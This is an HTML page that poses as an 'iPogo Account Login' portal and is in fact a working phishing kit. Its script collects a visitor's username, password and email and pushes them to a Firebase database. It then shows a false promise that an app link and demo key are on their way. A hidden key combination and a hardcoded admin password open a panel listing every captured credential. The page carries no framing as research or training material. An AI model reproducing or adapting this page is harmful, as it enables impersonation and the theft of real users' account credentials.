<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>iPogo Login Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Rubik', sans-serif;
      background: linear-gradient(to right, #000000, #1e1e1e);
      color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 400px;
      background: #1c1c1c;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
    }
    .logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .logo img {
      width: 150px;
    }
    h2, h3 {
      text-align: center;
      margin-bottom: 20px;
      color: #ffcc00;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-weight: 500;
    }
    input {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
      background: #333;
      color: white;
    }
    .btn {
      width: 100%;
      padding: 12px;
      background: #ffcc00;
      color: #000;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
    }
    .btn:hover {
      background: #e6b800;
    }
    #emailStep, #adminPanel, #adminAccess { display: none; }
    .success-msg {
      text-align: center;
      color: #80ff80;
      font-weight: bold;
      margin-top: 15px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      padding: 10px;
      border: 1px solid #444;
      text-align: left;
    }
    th {
      background: #ffcc00;
      color: #000;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://cdn.ipogo.app/assets/images/iPogo-logo-yellow.svg" alt="iPogo Logo" />
    </div>
    <h2>iPogo Account Login</h2>

    <div id="loginStep">
      <div class="form-group">
        <label>Username</label>
        <input type="text" id="username" />
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="password" />
      </div>
      <button class="btn" onclick="nextStep()">Next</button>
    </div>

    <div id="emailStep">
      <div class="form-group">
        <label>Email</label>
        <input type="email" id="email" />
      </div>
      <button class="btn" onclick="saveCredentials()">Submit</button>
      <p class="success-msg" id="successMsg"></p>
    </div>

    <div id="adminAccess">
      <label><strong>Admin Password:</strong></label>
      <input type="password" id="adminPassword" />
      <button class="btn" onclick="checkAdmin()">View Admin Panel</button>
    </div>

    <div id="adminPanel">
      <h3>Stored Credentials</h3>
      <table>
        <thead>
          <tr><th>Username</th><th>Password</th><th>Email</th><th>Time</th></tr>
        </thead>
        <tbody id="credTable"></tbody>
      </table>
      <button class="btn" style="background:#555; color:#fff;" onclick="clearAll()">Delete All</button>
    </div>
  </div>

  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDww9woXWjws5IXsNuuedCsnL1QOnH2xII",
      authDomain: "ipogo-3d1d6.firebaseapp.com",
      databaseURL: "https://ipogo-3d1d6-default-rtdb.firebaseio.com",
      projectId: "ipogo-3d1d6",
      storageBucket: "ipogo-3d1d6.firebasestorage.app",
      messagingSenderId: "623421100612",
      appId: "1:623421100612:web:20d6602fbece9b25e8a211",
      measurementId: "G-BZCRV70CP4"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function nextStep() {
      const uname = document.getElementById('username').value;
      const pass = document.getElementById('password').value;
      if (!uname || !pass) return alert('Please enter username and password.');

      document.getElementById('loginStep').innerHTML = '<p style="text-align:center">Processing...</p>';
      setTimeout(() => {
        document.getElementById('loginStep').style.display = 'none';
        document.getElementById('emailStep').style.display = 'block';
      }, 1200);
    }

    function saveCredentials() {
      const uname = document.getElementById('username').value;
      const pass = document.getElementById('password').value;
      const email = document.getElementById('email').value;
      const time = new Date().toLocaleString();
      if (!email) return alert('Please enter your email.');

      document.getElementById('successMsg').innerText = 'Saving your info...';

      setTimeout(() => {
        db.ref('credentials').push({ uname, pass, email, time });
        document.getElementById('successMsg').innerText = 'âœ… Thank you! The latest app link will be sent to the provided email within 15 minutes along with a 3-day demo key. If you do not receive it, please check your spam folder or contact support.';
      }, 1200);
    }

    function checkAdmin() {
      const pwd = prompt('Enter admin password:');
      const year = new Date().getFullYear();
      if (pwd === 'ipogo' + year + '!Secure') {
        document.getElementById('adminPanel').style.display = 'block';
        loadCredentials();
      } else {
        alert("Incorrect admin password.");
      }
    }

    function loadCredentials() {
      const table = document.getElementById('credTable');
      table.innerHTML = '';
      db.ref('credentials').once('value', snapshot => {
        snapshot.forEach(child => {
          const c = child.val();
          const row = `<tr><td>${c.uname}</td><td>${c.pass}</td><td>${c.email}</td><td>${c.time}</td></tr>`;
          table.innerHTML += row;
        });
      });
    }

    function clearAll() {
      if (confirm('Clear all saved data?')) {
        db.ref('credentials').remove().then(() => loadCredentials());
      }
    }

    window.addEventListener('keydown', (e) => {
      if (e.ctrlKey && e.key === 'A') {
        document.getElementById('adminAccess').style.display = 'block';
      }
    });
  </script>
</body>
</html>
